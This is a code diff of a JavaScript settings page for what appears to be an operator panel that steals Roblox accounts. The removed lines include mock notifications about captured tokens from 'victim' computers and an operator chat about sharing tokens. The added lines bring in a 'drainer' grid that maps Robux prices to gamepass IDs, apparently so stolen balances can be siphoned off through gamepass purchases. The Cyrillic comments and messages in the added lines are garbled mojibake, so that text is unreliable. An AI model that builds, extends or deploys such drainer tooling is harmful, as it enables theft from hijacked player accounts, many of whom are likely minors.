@@ -1,62 +1,95 @@
-// ── Страница настроек ────────────────────────────────────────────────────────
+﻿// в”Ђв”Ђ РЎС‚СЂР°РЅРёС†Р° РЅР°СЃС‚СЂРѕРµРє (СЃС‚Р°С‚РёС‡РµСЃРєР°СЏ РІРµСЂСЃРёСЏ) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
 if (!requireLogin()) throw new Error('redirect');
 
 document.getElementById('sidebarSlot').innerHTML = renderHeader('settings');
 bindLogout();
 
 let currentSettings = {};
-let currentAvatarImageBase64 = null;
+let currentAvatarImageBase64 = null; // РҐСЂР°РЅРёС‚ base64 С„РѕС‚Рѕ, РµСЃР»Рё РІС‹Р±СЂР°РЅРѕ
 
-// ── Загрузка текущих настроек ────────────────────────────────────────────────
+// в”Ђв”Ђ Р—Р°РіСЂСѓР·РєР° С‚РµРєСѓС‰РёС… РЅР°СЃС‚СЂРѕРµРє в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
 async function loadSettings() {
   try {
     const r = await apiFetch('/api/settings');
     const s = await r.json();
     currentSettings = s;
 
+    // Prefer localStorage values (they survive server restarts on Render free tier)
+    const localAvatar = localStorage.getItem('ft_avatar');
     const localAvatarImage = localStorage.getItem('ft_avatarImage');
     const localName = localStorage.getItem('ft_displayName');
     const localColor = localStorage.getItem('ft_themeColor');
     const localBio = localStorage.getItem('ft_bio');
+    const localDrainGamepasses = localStorage.getItem('ft_drainGamepasses');
 
     document.getElementById('displayName').value = localName || s.displayName || '';
     document.getElementById('bio').value = localBio || s.bio || '';
-    document.getElementById('themeColor').value = localColor || s.themeColor || '#38bdf8';
+    document.getElementById('themeColor').value = localColor || s.themeColor || '#00f0ff';
+    
+    const prices = [
+      500, 495, 490, 485, 480, 475, 470, 465, 460, 455, 450, 445, 440, 435, 430, 425, 420, 415, 410, 405, 400,
+      395, 390, 385, 380, 375, 370, 365, 360, 355, 350, 345, 340, 335, 330, 325, 320, 315, 310, 305, 300,
+      295, 290, 285, 280, 275, 270, 265, 260, 255, 250, 245, 240, 235, 230, 225, 220, 215, 210, 205, 200,
+      195, 190, 185, 180, 175, 170, 165, 160, 155, 150, 145, 140, 135, 130, 125, 120, 115, 110, 105, 100,
+      95, 90, 85, 80, 75, 70, 65, 60, 55, 50, 45, 40, 35, 30, 25, 20, 15, 10, 5
+    ];
+
+    let gps = {};
+    try {
+      gps = JSON.parse(localDrainGamepasses || s.drainGamepasses || '{}');
+    } catch(e) {
+      // Compatibility fallback
+      const str = localDrainGamepasses || s.drainGamepasses || '';
+      const arr = str.split(',').map(x => x.trim()).filter(Boolean);
+      for (let i = 0; i < Math.min(arr.length, prices.length); i++) {
+        gps[prices[i]] = arr[i];
+      }
+    }
+
+    renderDrainerGrid(prices, gps);
 
     const serverAvatarImage = s.avatarImage || null;
 
     if (localAvatarImage) {
       currentAvatarImageBase64 = localAvatarImage;
+      document.getElementById('avatarInput').value = '';
     } else if (serverAvatarImage) {
       currentAvatarImageBase64 = serverAvatarImage;
       localStorage.setItem('ft_avatarImage', serverAvatarImage);
+      document.getElementById('avatarInput').value = '';
     } else {
+      document.getElementById('avatarInput').value = localAvatar || s.avatar || '';
       currentAvatarImageBase64 = null;
     }
 
     updatePreview();
-    highlightSelectedColor(localColor || s.themeColor || '#38bdf8');
-    applyAccentColor(localColor || s.themeColor || '#38bdf8');
+    highlightSelectedEmoji(localAvatar || s.avatar);
+    highlightSelectedColor(localColor || s.themeColor);
+    applyAccentColor(localColor || s.themeColor);
   } catch (e) {
     if (e.message !== 'auth') {
+      // Fallback to localStorage if server is down
+      const localAvatar = localStorage.getItem('ft_avatar');
       const localName = localStorage.getItem('ft_displayName');
       const localColor = localStorage.getItem('ft_themeColor');
       const localBio = localStorage.getItem('ft_bio');
       document.getElementById('displayName').value = localName || '';
       document.getElementById('bio').value = localBio || '';
-      document.getElementById('themeColor').value = localColor || '#38bdf8';
+      document.getElementById('themeColor').value = localColor || '#00f0ff';
+      document.getElementById('avatarInput').value = localAvatar || 'рџ¦Љ';
       updatePreview();
     }
   }
 }
 
-// ── Загрузка фото аватара ────────────────────────────────────────────────────
-document.getElementById('avatarFileInput')?.addEventListener('change', function(e) {
+// в”Ђв”Ђ РћР±СЂР°Р±РѕС‚РєР° Р·Р°РіСЂСѓР·РєРё С„РѕС‚Рѕ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+document.getElementById('avatarFileInput').addEventListener('change', function(e) {
   const file = e.target.files[0];
   if (!file) return;
 
+  // РџСЂРѕРІРµСЂРєР° СЂР°Р·РјРµСЂР° (РґРѕ 5РњР‘, Р·Р°С‚РµРј СЃР¶РёРјР°РµС‚СЃСЏ)
   if (file.size > 5 * 1024 * 1024) {
-    toast('Файл слишком большой. Максимум 5 МБ.', 'err');
+    toast('Р¤Р°Р№Р» СЃР»РёС€РєРѕРј Р±РѕР»СЊС€РѕР№. РњР°РєСЃРёРјСѓРј 5 РњР‘.', 'err');
     return;
   }
 
@@ -74,7 +107,10 @@ document.getElementById('avatarFileInput')?.addEventListener('change', function(
       canvas.width = w; canvas.height = h;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(img, 0, 0, w, h);
-      currentAvatarImageBase64 = canvas.toDataURL('image/jpeg', 0.85);
+      currentAvatarImageBase64 = canvas.toDataURL('image/jpeg', 0.8);
+      
+      document.getElementById('avatarInput').value = ''; // РѕС‡РёС‰Р°РµРј СЌРјРѕРґР·Рё
+      highlightSelectedEmoji('');
       updatePreview();
     };
     img.src = e.target.result;
@@ -82,66 +118,84 @@ document.getElementById('avatarFileInput')?.addEventListener('change', function(
   reader.readAsDataURL(file);
 });
 
-document.getElementById('btnResetAvatar')?.addEventListener('click', function() {
+document.getElementById('btnResetAvatar').addEventListener('click', function() {
   currentAvatarImageBase64 = null;
-  const input = document.getElementById('avatarFileInput');
-  if (input) input.value = '';
-  localStorage.removeItem('ft_avatarImage');
-  localStorage.removeItem('ft_avatar');
+  document.getElementById('avatarFileInput').value = '';
+  document.getElementById('avatarInput').value = 'рџ¦Љ'; // РґРµС„РѕР»С‚ СЌРјРѕРґР·Рё
+  highlightSelectedEmoji('рџ¦Љ');
   updatePreview();
 });
 
-// ── Обновление превью ────────────────────────────────────────────────────────
+// в”Ђв”Ђ РћР‘РќРћР’Р›Р•РќРР• РџР Р•Р’Р¬Р® в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
 function updatePreview() {
-  const name = document.getElementById('displayName').value || getUser() || 'Operator';
+  const name = document.getElementById('displayName').value || getUser();
   const bio = document.getElementById('bio').value || '...';
   
-  const previewName = document.getElementById('previewName');
-  const previewBio = document.getElementById('previewBio');
-  if (previewName) previewName.textContent = name;
-  if (previewBio) previewBio.textContent = bio;
+  document.getElementById('previewName').textContent = name;
+  document.getElementById('previewBio').textContent = bio;
 
   const previewEl = document.getElementById('previewAvatar');
-  if (!previewEl) return;
 
   if (currentAvatarImageBase64) {
     previewEl.innerHTML = '<img src="' + currentAvatarImageBase64 + '" style="width:100%;height:100%;object-fit:cover;border-radius:50%;">';
   } else {
-    const initial = name.trim().toUpperCase().charAt(0) || 'O';
-    previewEl.innerHTML = escapeHtml(initial);
+    const emoji = document.getElementById('avatarInput').value || 'рџ¤–';
+    previewEl.innerHTML = escapeHtml(emoji);
   }
 }
 
-// ── Выбор цвета ──────────────────────────────────────────────────────────────
+// в”Ђв”Ђ РџРѕРґСЃРІРµС‚РєР° РІС‹Р±СЂР°РЅРЅРѕРіРѕ СЌРјРѕРґР·Рё в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+function highlightSelectedEmoji(emoji) {
+  document.querySelectorAll('.emoji-btn').forEach(btn => {
+    btn.classList.toggle('selected', btn.dataset.emoji === emoji);
+  });
+}
+
+// в”Ђв”Ђ РџРѕРґСЃРІРµС‚РєР° РІС‹Р±СЂР°РЅРЅРѕРіРѕ С†РІРµС‚Р° в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
 function highlightSelectedColor(color) {
   document.querySelectorAll('.color-dot').forEach(btn => {
     btn.classList.toggle('selected', btn.dataset.color === color);
   });
 }
 
+// в”Ђв”Ђ Emoji picker в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+document.querySelectorAll('.emoji-btn').forEach(btn => {
+  btn.addEventListener('click', function() {
+    const emoji = this.dataset.emoji;
+    document.getElementById('avatarInput').value = emoji;
+    currentAvatarImageBase64 = null; // РЎР±СЂР°СЃС‹РІР°РµРј С„РѕС‚Рѕ РїСЂРё РІС‹Р±РѕСЂРµ СЌРјРѕРґР·Рё
+    highlightSelectedEmoji(emoji);
+    updatePreview();
+  });
+});
+
+// в”Ђв”Ђ Color picker (Live Preview) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
 function handleColorChange(color) {
   document.getElementById('themeColor').value = color;
   highlightSelectedColor(color);
-  applyAccentColor(color);
+  applyAccentColor(color); // Live update of CSS variables
 }
 
 document.querySelectorAll('.color-dot').forEach(btn => {
   btn.addEventListener('click', function() { handleColorChange(this.dataset.color); });
 });
 
-document.getElementById('themeColor')?.addEventListener('input', function() {
+document.getElementById('themeColor').addEventListener('input', function() {
   handleColorChange(this.value);
 });
 
-// ── Live preview ─────────────────────────────────────────────────────────────
-['displayName', 'bio'].forEach(id => {
-  document.getElementById(id)?.addEventListener('input', function() {
+// в”Ђв”Ђ Live preview РЅР° РІРІРѕРґ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+['displayName', 'avatarInput', 'bio'].forEach(id => {
+  document.getElementById(id).addEventListener('input', function() {
+    if (id === 'avatarInput' && this.value.trim() !== '') {
+      currentAvatarImageBase64 = null; // Р•СЃР»Рё СЋР·РµСЂ РІСЂСѓС‡РЅСѓСЋ РІРІРѕРґРёС‚ СЌРјРѕРґР·Рё, СЃР±СЂР°СЃС‹РІР°РµРј С„РѕС‚Рѕ
+    }
     updatePreview();
   });
 });
 
-// ── Сохранение настроек ──────────────────────────────────────────────────────
-document.getElementById('btnSave')?.addEventListener('click', async function() {
+// в”Ђв”Ђ РЎРѕС…СЂР°РЅРµРЅРёРµ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+document.getElementById('btnSave').addEventListener('click', async function() {
   const btn = this;
   
   const name = document.getElementById('displayName').value.trim();
@@ -150,14 +204,24 @@ document.getElementById('btnSave')?.addEventListener('click', async function() {
   const currPwd = document.getElementById('currentPassword').value;
   const newPwd = document.getElementById('newPassword').value;
   
+  const gpData = {};
+  document.querySelectorAll('.gp-input').forEach(input => {
+    const val = input.value.trim();
+    if (val) gpData[input.dataset.price] = val;
+  });
+  const drainGamepasses = JSON.stringify(gpData);
+  
   const data = {
     displayName: name,
     themeColor: themeColor,
-    bio: bio
+    bio: bio,
+    drainGamepasses: drainGamepasses
   };
 
   if (currentAvatarImageBase64) {
     data.avatarImage = currentAvatarImageBase64;
+  } else {
+    data.avatar = document.getElementById('avatarInput').value.trim();
   }
 
   if (newPwd) {
@@ -166,7 +230,7 @@ document.getElementById('btnSave')?.addEventListener('click', async function() {
   }
 
   btn.disabled = true;
-  btn.textContent = 'Сохранение...';
+  btn.textContent = 'РЎРѕС…СЂР°РЅРµРЅРёРµ...';
 
   try {
     const r = await apiFetch('/api/settings', {
@@ -176,135 +240,81 @@ document.getElementById('btnSave')?.addEventListener('click', async function() {
     });
     const resp = await r.json();
     if (resp.success) {
-      toast('Настройки сохранены');
+      toast('вњ… РќР°СЃС‚СЂРѕР№РєРё СЃРѕС…СЂР°РЅРµРЅС‹');
       document.getElementById('newPassword').value = '';
       document.getElementById('currentPassword').value = '';
       currentSettings = resp.settings;
 
+      // РЎРѕС…СЂР°РЅСЏРµРј РІ localStorage вЂ” РїРµСЂРµР¶РёРІС‘С‚ РїРµСЂРµР·Р°РїСѓСЃРє Render
       localStorage.setItem('ft_themeColor', data.themeColor);
       if (data.displayName) localStorage.setItem('ft_displayName', data.displayName);
       if (data.bio) localStorage.setItem('ft_bio', data.bio);
+      if (data.drainGamepasses) localStorage.setItem('ft_drainGamepasses', data.drainGamepasses);
 
       if (data.avatarImage) {
         localStorage.setItem('ft_avatarImage', data.avatarImage);
-      } else {
+        localStorage.removeItem('ft_avatar');
+      } else if (data.avatar) {
+        localStorage.setItem('ft_avatar', data.avatar);
         localStorage.removeItem('ft_avatarImage');
       }
       
+      // РџРµСЂРµСЂРёСЃРѕРІС‹РІР°РµРј С€Р°РїРєСѓ С‡С‚РѕР±С‹ РёР·РјРµРЅРµРЅРёСЏ РІСЃС‚СѓРїРёР»Рё РІ СЃРёР»Сѓ
       document.getElementById('sidebarSlot').innerHTML = renderHeader('settings');
       bindLogout();
     } else {
-      toast(resp.error || 'Ошибка сохранения', 'err');
+      toast(resp.error || 'РћС€РёР±РєР° СЃРѕС…СЂР°РЅРµРЅРёСЏ', 'err');
     }
   } catch (e) {
-    if (e.message !== 'auth') toast('Ошибка связи с сервером', 'err');
+    if (e.message !== 'auth') toast('РћС€РёР±РєР° СЃРІСЏР·Рё СЃ СЃРµСЂРІРµСЂРѕРј', 'err');
   }
 
   btn.disabled = false;
-  btn.textContent = 'Сохранить настройки';
+  btn.textContent = 'РЎРѕС…СЂР°РЅРёС‚СЊ РЅР°СЃС‚СЂРѕР№РєРё';
 });
 
-// ── Тест уведомлений ─────────────────────────────────────────────────────────
-document.getElementById('btnTestNewNotification')?.addEventListener('click', () => {
-  showTokenNotification({
-    username: 'RobloxLegend_2026',
-    userId: '1842039',
-    robux: 24500,
-    computer: 'DESKTOP-NEW-VICTIM',
-    lastLogin: null // Новый аккаунт
-  });
-  toast('Тестовое уведомление: Новый аккаунт');
-});
+// в”Ђв”Ђ РђРІС‚Рѕ-СЃРѕР·РґР°РЅРёРµ РіРµР№РјРїР°СЃСЃРѕРІ С‡РµСЂРµР· СЂР°СЃС€РёСЂРµРЅРёРµ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+let gamepassCreationTimeout = null;
 
-document.getElementById('btnTestOldNotification')?.addEventListener('click', () => {
-  const thirtyFourDaysAgo = Date.now() - (34 * 24 * 60 * 60 * 1000) - (2 * 60 * 60 * 1000);
-  showTokenNotification({
-    username: 'TraderPro_Robux',
-    userId: '492015',
-    robux: 8900,
-    computer: 'DESKTOP-OLD-PC',
-    lastLogin: thirtyFourDaysAgo // Был вход ~1 месяц назад
-  });
-  toast('Тестовое уведомление: Повторный аккаунт (34 дн.)');
-});
-
-document.getElementById('btnBrowserPermission')?.addEventListener('click', async () => {
-  if (!("Notification" in window)) {
-    toast('Браузер не поддерживает уведомления', 'err');
+function renderDrainerGrid(pricesList, savedIds = {}) {
+  const grid = document.getElementById('drainerGrid');
+  grid.innerHTML = '';
+  
+  if (pricesList.length === 0) {
+    grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: rgba(255,255,255,0.4); padding: 1rem;">РќРµС‚ С†РµРЅ РґР»СЏ РѕС‚РѕР±СЂР°Р¶РµРЅРёСЏ. Р’РІРµРґРёС‚Рµ РёС… РІС‹С€Рµ С‡РµСЂРµР· Р·Р°РїСЏС‚СѓСЋ.</div>';
     return;
   }
-  const perm = await Notification.requestPermission();
-  if (perm === 'granted') {
-    toast('Системные уведомления включены');
-  } else {
-    toast('Разрешение отклонено в настройках браузера', 'err');
-  }
-});
 
-// ── Тестирование бейджей меню ────────────────────────────────────────────────
-document.getElementById('btnTestAddNotifBadge')?.addEventListener('click', () => {
-  showTokenNotification({
-    username: 'FastTest_Player',
-    userId: '1842039',
-    robux: 5000,
-    computer: 'DESKTOP-TEST',
-    lastLogin: null
+  pricesList.forEach(price => {
+    const item = document.createElement('div');
+    item.className = 'drainer-item';
+    
+    const label = document.createElement('label');
+    label.textContent = price.toLocaleString('ru-RU') + ' R$';
+    
+    const input = document.createElement('input');
+    input.type = 'text';
+    input.className = 'settings-input gp-input';
+    input.dataset.price = price;
+    input.placeholder = 'ID РіРµР№РјРїР°СЃСЃР°';
+    if (savedIds[price]) {
+      input.value = savedIds[price];
+    }
+    
+    item.appendChild(label);
+    item.appendChild(input);
+    grid.appendChild(item);
   });
-  
-  const notifBadge = document.getElementById('sidebarNotifBadge');
-  if (notifBadge) {
-    const unread = getUnreadNotificationsCount();
-    notifBadge.textContent = unread > 99 ? '99+' : unread;
-    notifBadge.style.display = 'inline-flex';
-  }
-  toast('Красный счётчик уведомлений обновлен');
-});
+}
 
-document.getElementById('btnTestAddChatBadge')?.addEventListener('click', () => {
-  const cached = JSON.parse(localStorage.getItem('ft_cached_chat_messages') || '[]');
-  cached.push({
-    id: 'sim_' + Date.now(),
-    operator: 'Operator_Alex',
-    displayName: 'Operator_Alex',
-    text: 'Привет! Проверьте чат, поделился новым токеном',
-    createdAt: new Date().toISOString()
+function getCurrentTypedIds() {
+  const data = {};
+  document.querySelectorAll('.gp-input').forEach(input => {
+    const val = input.value.trim();
+    if (val) data[input.dataset.price] = val;
   });
-  localStorage.setItem('ft_cached_chat_messages', JSON.stringify(cached));
+  return data;
+}
 
-  const chatBadge = document.getElementById('sidebarChatBadge');
-  if (chatBadge) {
-    const unread = getUnreadChatCount() || 1;
-    chatBadge.textContent = unread > 99 ? '99+' : unread;
-    chatBadge.style.display = 'inline-flex';
-  }
-  toast('Красный счётчик чата обновлен (+1)');
-});
-
-document.getElementById('btnTestToggleUpdateBadge')?.addEventListener('click', () => {
-  localStorage.removeItem('ft_has_seen_updates');
-  const badge = document.getElementById('sidebarUpdatesBadge');
-  if (badge) {
-    badge.textContent = 'NEW';
-    badge.style.display = 'inline-flex';
-  }
-  toast('Бейдж «NEW» на вкладке «Обновления» включен');
-});
-
-document.getElementById('btnTestClearBadges')?.addEventListener('click', () => {
-  localStorage.setItem(getUserNotifTimeKey(), String(Date.now()));
-  localStorage.setItem(getUserChatTimeKey(), String(Date.now()));
-  localStorage.setItem('ft_has_seen_updates', 'true');
-  
-  const notifBadge = document.getElementById('sidebarNotifBadge');
-  if (notifBadge) notifBadge.style.display = 'none';
-
-  const chatBadge = document.getElementById('sidebarChatBadge');
-  if (chatBadge) chatBadge.style.display = 'none';
-
-  const updatesBadge = document.getElementById('sidebarUpdatesBadge');
-  if (updatesBadge) updatesBadge.style.display = 'none';
-
-  toast('Все индикаторы и бейджи сброшены');
-});
 
 loadSettings();
